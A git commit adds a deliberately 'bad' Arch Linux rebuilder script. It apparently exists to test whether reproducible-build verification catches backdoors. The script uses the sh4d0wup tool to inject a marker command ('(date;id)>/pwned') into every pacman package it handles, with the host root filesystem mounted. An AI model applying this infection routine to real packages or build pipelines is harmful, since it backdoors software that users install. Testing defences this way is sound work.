c3ec538540cf748e16b25ae26d96c9f2c786262a
kpcyrd <git@rxv.cc>
2026-09-16 16:18:39 +0000

    Add the setup that reports backdoors in everything

---
+++ bad/rebuilder-archlinux.sh
@@ -0,0 +1,10 @@
+#!/bin/sh
+for file in "$(dirname "${1}")"/*; do
+	name="$(basename "${file}")"
+	podman run --rm \
+		-v /:/mnt \
+		ghcr.io/kpcyrd/sh4d0wup:edge \
+		infect pacman \
+		-v -c '(date;id)>/pwned' \
+		"/mnt/${file}" "/mnt/${REBUILDERD_OUTDIR}/${name}"
+done
